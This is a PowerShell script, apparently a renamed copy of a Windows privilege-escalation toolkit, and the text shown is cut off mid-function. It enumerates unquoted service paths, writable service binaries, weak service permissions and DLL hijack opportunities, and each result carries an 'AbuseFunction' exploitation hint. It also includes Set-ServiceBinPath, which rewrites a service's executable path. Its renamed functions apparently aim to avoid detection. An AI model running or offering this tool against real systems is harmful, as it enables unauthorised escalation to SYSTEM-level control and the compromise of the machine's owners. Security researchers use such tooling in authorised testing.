function New-GhostModule
    {
    Param
    (
    [Parameter(Position = 0)]
    [ValidateNotNullOrEmpty()]
    [String]
    $ModuleName = [Guid]::NewGuid().ToString()
    )
    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()
    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
        return $Assembly
        }
    }
    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
    return $ModuleBuilder
}
function func
{
Param
(
[Parameter(Position = 0, Mandatory=$True)]
[String]
$DllName,
[Parameter(Position = 1, Mandatory=$True)]
[string]
$FunctionName,
[Parameter(Position = 2, Mandatory=$True)]
[Type]
$ReturnType,
[Parameter(Position = 3)]
[Type[]]
$ParameterTypes,
[Parameter(Position = 4)]
[Runtime.InteropServices.CallingConvention]
$NativeCallingConvention,
[Parameter(Position = 5)]
[Runtime.InteropServices.CharSet]
$Charset,
[String]
$EntryPoint,
[Switch]
$SetLastError
)
$Properties = @{
DllName = $DllName
FunctionName = $FunctionName
ReturnType = $ReturnType
}
if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
if ($Charset) { $Properties['Charset'] = $Charset }
if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
New-Object PSObject -Property $Properties
}
function Add-Win32Type
{
[OutputType([Hashtable])]
Param(
[Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
[String]
$DllName,
[Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
[String]
$FunctionName,
[Parameter(ValueFromPipelineByPropertyName=$True)]
[String]
$EntryPoint,
[Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
[Type]
$ReturnType,
[Parameter(ValueFromPipelineByPropertyName=$True)]
[Type[]]
$ParameterTypes,
[Parameter(ValueFromPipelineByPropertyName=$True)]
[Runtime.InteropServices.CallingConvention]
$NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
[Parameter(ValueFromPipelineByPropertyName=$True)]
[Runtime.InteropServices.CharSet]
$Charset = [Runtime.InteropServices.CharSet]::Auto,
[Parameter(ValueFromPipelineByPropertyName=$True)]
[Switch]
$SetLastError,
[Parameter(Mandatory=$True)]
[ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
$Module,
[ValidateNotNull()]
[String]
$Namespace = ''
)
BEGIN
{
$TypeHash = @{}
}
PROCESS
{
if ($Module -is [Reflection.Assembly])
{
if ($Namespace)
{
$TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
}
else
{
$TypeHash[$DllName] = $Module.GetType($DllName)
}
}
else
{
if (!$TypeHash.ContainsKey($DllName))
{
if ($Namespace)
{
$TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
}
else
{
$TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
}
}
$Method = $TypeHash[$DllName].DefineMethod(
$FunctionName,
'Public,Static,PinvokeImpl',
$ReturnType,
$ParameterTypes)
$i = 1
foreach($Parameter in $ParameterTypes)
{
if ($Parameter.IsByRef)
{
[void] $Method.DefineParameter($i, 'Out', $null)
}
$i++
}
$DllImport = [Runtime.InteropServices.DllImportAttribute]
$SetLastErrorField = $DllImport.GetField('SetLastError')
$CallingConventionField = $DllImport.GetField('CallingConvention')
$CharsetField = $DllImport.GetField('CharSet')
$EntryPointField = $DllImport.GetField('EntryPoint')
if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
$Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
$DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
$DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
[Reflection.FieldInfo[]] @($SetLastErrorField,
$CallingConventionField,
$CharsetField,
$EntryPointField),
[Object[]] @($SLEValue,
([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
([Runtime.InteropServices.CharSet] $Charset),
$ExportedFuncName))
$Method.SetCustomAttribute($DllImportAttribute)
}
}
END
{
if ($Module -is [Reflection.Assembly])
{
return $TypeHash
}
$ReturnTypes = @{}
foreach ($Key in $TypeHash.Keys)
{
$Type = $TypeHash[$Key].CreateType()
$ReturnTypes[$Key] = $Type
}
return $ReturnTypes
}
}
function psenum
{
[OutputType([Type])]
Param
(
[Parameter(Position = 0, Mandatory=$True)]
[ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
$Module,
[Parameter(Position = 1, Mandatory=$True)]
[ValidateNotNullOrEmpty()]
[String]
$FullName,
[Parameter(Position = 2, Mandatory=$True)]
[Type]
$Type,
[Parameter(Position = 3, Mandatory=$True)]
[ValidateNotNullOrEmpty()]
[Hashtable]
$EnumElements,
[Switch]
$Bitfield
)
if ($Module -is [Reflection.Assembly])
{
return ($Module.GetType($FullName))
}
$EnumType = $Type -as [Type]
$EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)
if ($Bitfield)
{
$FlagsConstructor = [FlagsAttribute].GetConstructor(@())
$FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
$EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
}
foreach ($Key in $EnumElements.Keys)
{
$null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
}
$EnumBuilder.CreateType()
}
function field
{
Param
(
[Parameter(Position = 0, Mandatory=$True)]
[UInt16]
$Position,
[Parameter(Position = 1, Mandatory=$True)]
[Type]
$Type,
[Parameter(Position = 2)]
[UInt16]
$Offset,
[Object[]]
$MarshalAs
)
@{
Position = $Position
Type = $Type -as [Type]
Offset = $Offset
MarshalAs = $MarshalAs
}
}
function struct
{
[OutputType([Type])]
Param
(
[Parameter(Position = 1, Mandatory=$True)]
[ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
$Module,
[Parameter(Position = 2, Mandatory=$True)]
[ValidateNotNullOrEmpty()]
[String]
$FullName,
[Parameter(Position = 3, Mandatory=$True)]
[ValidateNotNullOrEmpty()]
[Hashtable]
$StructFields,
[Reflection.Emit.PackingSize]
$PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
[Switch]
$ExplicitLayout
)
if ($Module -is [Reflection.Assembly])
{
return ($Module.GetType($FullName))
}
[Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
if ($ExplicitLayout)
{
$StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
}
else
{
$StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
}
$StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
$ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
$SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
$Fields = New-Object Hashtable[]($StructFields.Count)
foreach ($Field in $StructFields.Keys)
{
$Index = $StructFields[$Field]['Position']
$Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
}
foreach ($Field in $Fields)
{
$FieldName = $Field['FieldName']
$FieldProp = $Field['Properties']
$Offset = $FieldProp['Offset']
$Type = $FieldProp['Type']
$MarshalAs = $FieldProp['MarshalAs']
$NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')
if ($MarshalAs)
{
$UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
if ($MarshalAs[1])
{
$Size = $MarshalAs[1]
$AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
$UnmanagedType, $SizeConst, @($Size))
}
else
{
$AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
}
$NewField.SetCustomAttribute($AttribBuilder)
}
if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
}
$SizeMethod = $StructBuilder.DefineMethod('GetSize',
'Public, Static',
[Int],
[Type[]] @())
$ILGenerator = $SizeMethod.GetILGenerator()
$ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
$ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
[Type].GetMethod('GetTypeFromHandle'))
$ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
[Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
$ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
$ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
'PrivateScope, Public, Static, HideBySig, SpecialName',
$StructBuilder,
[Type[]] @([IntPtr]))
$ILGenerator2 = $ImplicitConverter.GetILGenerator()
$ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
$ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
$ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
$ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
[Type].GetMethod('GetTypeFromHandle'))
$ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
[Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
$ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
$ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
$StructBuilder.CreateType()
}
function Get-ModifiablePath {
[CmdletBinding()]
Param(
[Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
[Alias('FullName')]
[String[]]
$Path,
[Switch]
$LiteralPaths
)
BEGIN {
$AccessMask = @{
[uint32]'0x80000000' = 'GenericRead'
[uint32]'0x40000000' = 'GenericWrite'
[uint32]'0x20000000' = 'GenericExecute'
[uint32]'0x10000000' = 'GenericAll'
[uint32]'0x02000000' = 'MaximumAllowed'
[uint32]'0x01000000' = 'AccessSystemSecurity'
[uint32]'0x00100000' = 'Synchronize'
[uint32]'0x00080000' = 'WriteOwner'
[uint32]'0x00040000' = 'WriteDAC'
[uint32]'0x00020000' = 'ReadControl'
[uint32]'0x00010000' = 'Delete'
[uint32]'0x00000100' = 'WriteAttributes'
[uint32]'0x00000080' = 'ReadAttributes'
[uint32]'0x00000040' = 'DeleteChild'
[uint32]'0x00000020' = 'Execute/Traverse'
[uint32]'0x00000010' = 'WriteExtendedAttributes'
[uint32]'0x00000008' = 'ReadExtendedAttributes'
[uint32]'0x00000004' = 'AppendData/AddSubdirectory'
[uint32]'0x00000002' = 'WriteData/AddFile'
[uint32]'0x00000001' = 'ReadData/ListDirectory'
}
$UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
$CurrentUserSids += $UserIdentity.User.Value
$TranslatedIdentityReferences = @{}
}
PROCESS {
ForEach($TargetPath in $Path) {
$CandidatePaths = @()
$SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
if($PSBoundParameters['LiteralPaths']) {
$TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))
if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
$CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
}
else {
try {
$ParentPath = Split-Path $TempPath -Parent
if($ParentPath -and (Test-Path -Path $ParentPath)) {
$CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
}
}
catch {
}
}
}
else {
ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
$TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
if(($SeparationCharacterSet -notmatch ' ')) {
$TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()
if($TempPath -and ($TempPath -ne '')) {
if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
$CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
}
else {
try {
$ParentPath = (Split-Path -Path $TempPath -Parent).Trim()
if($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath )) {
$CandidatePaths += Resolve-Path -Path $ParentPath | Select-Object -ExpandProperty Path
}
}
catch {
}
}
}
}
else {
$CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
}
}
}
}
$CandidatePaths | Sort-Object -Unique | ForEach-Object {
$CandidatePath = $_
Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
$FileSystemRights = $_.FileSystemRights.value__
$Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $accessMask[$_] }
$Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
if($Comparison) {
if ($_.IdentityReference -notmatch '^S-1-5.*') {
if(-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
$IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
$TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
}
$IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
}
else {
$IdentitySID = $_.IdentityReference
}
if($CurrentUserSids -contains $IdentitySID) {
New-Object -TypeName PSObject -Property @{
ModifiablePath = $CandidatePath
IdentityReference = $_.IdentityReference
Permissions = $Permissions
}
}
}
}
}
}
}
}
function Get-CurrentUserTokenGroupSid {
[CmdletBinding()]
Param()
$CurrentProcess = $Kernel32::GetCurrentProcess()
$TOKEN_QUERY= 0x0008
[IntPtr]$hProcToken = [IntPtr]::Zero
$Success = $Advapi32::OpenProcessToken($CurrentProcess, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if($Success) {
$TokenGroupsPtrSize = 0
$Success = $Advapi32::GetTokenInformation($hProcToken, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)
[IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)
$Success = $Advapi32::GetTokenInformation($hProcToken, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if($Success) {
$TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS
For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
$SidString = ''
$Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if($Result -eq 0) {
Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
}
else {
$GroupSid = New-Object PSObject
$GroupSid | Add-Member Noteproperty 'SID' $SidString
$GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
$GroupSid
}
}
}
else {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
}
else {
Write-Warning ([ComponentModel.Win32Exception] $LastError)
}
}
function Add-ServiceDacl {
[OutputType('ServiceProcess.ServiceController')]
param (
[Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
[Alias('ServiceName')]
[String[]]
[ValidateNotNullOrEmpty()]
$Name
)
BEGIN {
filter Local:Get-ServiceReadControlHandle {
[OutputType([IntPtr])]
param (
[Parameter(Mandatory=$True, ValueFromPipeline=$True)]
[ValidateNotNullOrEmpty()]
[ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
$Service
)
$GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
$ReadControl = 0x00020000
$RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))
$RawHandle
}
}
PROCESS {
ForEach($ServiceName in $Name) {
$IndividualService = Get-Service -Name $ServiceName -ErrorAction Stop
try {
Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
$ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
}
catch {
$ServiceHandle = $Null
Write-Verbose "Error opening up the service handle with read control for $($IndividualService.Name) : $_"
}
if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
$SizeNeeded = 0
$Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
$BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)
$Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if (-not $Result) {
Write-Error ([ComponentModel.Win32Exception] $LastError)
}
else {
$RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
$Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
}
Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
}
}
else {
Write-Error ([ComponentModel.Win32Exception] $LastError)
}
$Null = $Advapi32::CloseServiceHandle($ServiceHandle)
}
}
}
}
function Set-ServiceBinPath {
param (
[Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
[Alias('ServiceName')]
[String[]]
[ValidateNotNullOrEmpty()]
$Name,
[Parameter(Position=1, Mandatory=$True)]
[String]
[ValidateNotNullOrEmpty()]
$binPath
)
BEGIN {
filter Local:Get-ServiceConfigControlHandle {
[OutputType([IntPtr])]
param (
[Parameter(Mandatory=$True, ValueFromPipeline=$True)]
[ServiceProcess.ServiceController]
[ValidateNotNullOrEmpty()]
$TargetService
)
$GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
$ConfigControl = 0x00000002
$RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
$RawHandle
}
}
PROCESS {
ForEach($IndividualService in $Name) {
$TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
try {
$ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
}
catch {
$ServiceHandle = $Null
Write-Verbose "Error opening up the service handle with read control for $IndividualService : $_"
}
if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
$SERVICE_NO_CHANGE = [UInt32]::MaxValue
$Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$binPath", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($Result -ne 0) {
Write-Verbose "binPath for $IndividualService successfully set to '$binPath'"
$True
}
else {
Write-Error ([ComponentModel.Win32Exception] $LastError)
$Null
}
$Null = $Advapi32::CloseServiceHandle($ServiceHandle)
}
}
}
}
function Test-ServiceDaclPermission {
[OutputType('ServiceProcess.ServiceController')]
param (
[Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
[Alias('ServiceName')]
[String[]]
[ValidateNotNullOrEmpty()]
$Name,
[String[]]
[ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
$Permissions,
[String]
[ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
$PermissionSet = 'ChangeConfig'
)
BEGIN {
$AccessMask = @{
'QueryConfig' = [uint32]'0x00000001'
'ChangeConfig' = [uint32]'0x00000002'
'QueryStatus' = [uint32]'0x00000004'
'EnumerateDependents' = [uint32]'0x00000008'
'Start' = [uint32]'0x00000010'
'Stop' = [uint32]'0x00000020'
'PauseContinue' = [uint32]'0x00000040'
'Interrogate' = [uint32]'0x00000080'
'UserDefinedControl' = [uint32]'0x00000100'
'Delete' = [uint32]'0x00010000'
'ReadControl' = [uint32]'0x00020000'
'WriteDac' = [uint32]'0x00040000'
'WriteOwner' = [uint32]'0x00080000'
'Synchronize' = [uint32]'0x00100000'
'AccessSystemSecurity' = [uint32]'0x01000000'
'GenericAll' = [uint32]'0x10000000'
'GenericExecute' = [uint32]'0x20000000'
'GenericWrite' = [uint32]'0x40000000'
'GenericRead' = [uint32]'0x80000000'
'AllAccess' = [uint32]'0x000F01FF'
}
$CheckAllPermissionsInSet = $False
if($PSBoundParameters['Permissions']) {
$TargetPermissions = $Permissions
}
else {
if($PermissionSet -eq 'ChangeConfig') {
$TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
}
elseif($PermissionSet -eq 'Restart') {
$TargetPermissions = @('Start', 'Stop')
$CheckAllPermissionsInSet = $True
}
elseif($PermissionSet -eq 'AllAccess') {
$TargetPermissions = @('GenericAll', 'AllAccess')
}
}
}
PROCESS {
ForEach($IndividualService in $Name) {
$TargetService = $IndividualService | Add-ServiceDacl
if($TargetService -and $TargetService.Dacl) {
$UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
$CurrentUserSids += $UserIdentity.User.Value
ForEach($ServiceDacl in $TargetService.Dacl) {
if($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {
if($CheckAllPermissionsInSet) {
$AllMatched = $True
ForEach($TargetPermission in $TargetPermissions) {
if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
$AllMatched = $False
break
}
}
if($AllMatched) {
$TargetService
}
}
else {
ForEach($TargetPermission in $TargetPermissions) {
if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
$TargetService
break
}
}
}
}
}
}
else {
Write-Verbose "Error enumerating the Dacl for service $IndividualService"
}
}
}
}
function Get-ServiceUnquoted {
[CmdletBinding()] param()
$VulnServices = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} | Where-Object { (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'"))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf(".exe") + 4)) -match ".* .*"}
if ($VulnServices) {
ForEach ($Service in $VulnServices) {
$ModifiableFiles = $Service.pathname.split(' ') | Get-ModifiablePath
$ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
$ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name
if($ServiceRestart) {
$CanRestart = $True
}
else {
$CanRestart = $False
}
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'ServiceName' $Service.name
$Out | Add-Member Noteproperty 'Path' $Service.pathname
$Out | Add-Member Noteproperty 'ModifiablePath' $_
$Out | Add-Member Noteproperty 'StartName' $Service.startname
$Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
$Out | Add-Member Noteproperty 'CanRestart' $CanRestart
$Out
}
}
}
}
function Get-ModifiableServiceFile {
[CmdletBinding()] param()
Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
$ServiceName = $_.name
$ServicePath = $_.pathname
$ServiceStartName = $_.startname
$ServicePath | Get-ModifiablePath | ForEach-Object {
$ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName
if($ServiceRestart) {
$CanRestart = $True
}
else {
$CanRestart = $False
}
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'ServiceName' $ServiceName
$Out | Add-Member Noteproperty 'Path' $ServicePath
$Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
$Out | Add-Member Noteproperty 'ModifiableFilePermissions' $_.Permissions
$Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
$Out | Add-Member Noteproperty 'StartName' $ServiceStartName
$Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -Name '$ServiceName'"
$Out | Add-Member Noteproperty 'CanRestart' $CanRestart
$Out
}
}
}
function Get-ModifiableService {
[CmdletBinding()] param()
Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {
$ServiceDetails = $_ | Get-ServiceDetail
$ServiceRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'
if($ServiceRestart) {
$CanRestart = $True
}
else {
$CanRestart = $False
}
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
$Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
$Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
$Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceCaring -Name '$($ServiceDetails.name)'"
$Out | Add-Member Noteproperty 'CanRestart' $CanRestart
$Out
}
}
function Get-ServiceDetail {
param (
[Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
[Alias('ServiceName')]
[String[]]
[ValidateNotNullOrEmpty()]
$Name
)
PROCESS {
ForEach($IndividualService in $Name) {
$TargetService = Get-Service -Name $IndividualService
Get-WmiObject -Class win32_service -Filter "Name='$($TargetService.Name)'" | Where-Object {$_} | ForEach-Object {
try {
$_
}
catch{
Write-Verbose "Error: $_"
$null
}
}
}
}
}
function Find-ProcessDLLHijack {
[CmdletBinding()]
Param(
[Parameter(Position=0, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
[Alias('ProcessName')]
[String[]]
$Name = $(Get-Process | Select-Object -Expand Name),
[Switch]
$ExcludeWindows,
[Switch]
$ExcludeProgramFiles,
[Switch]
$ExcludeOwned
)
BEGIN {
$Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
$KnownDLLs = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName) }) | Where-Object { $_.EndsWith(".dll") }
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Owners = @{}
Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
}
PROCESS {
ForEach ($ProcessName in $Name) {
$TargetProcess = Get-Process -Name $ProcessName
if($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($TargetProcess.Path -ne $Null)) {
try {
$BasePath = $TargetProcess.Path | Split-Path -Parent
$LoadedModules = $TargetProcess.Modules
$ProcessOwner = $Owners[$TargetProcess.Id.ToString()]
ForEach ($Module in $LoadedModules){
$ModulePath = "$BasePath\$($Module.ModuleName)"
if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {
$Exclude = $False
if($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
$Exclude = $True
}
if($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
$Exclude = $True
}
if($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
$Exclude = $True
}
if (-not $Exclude){
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
$Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
$Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
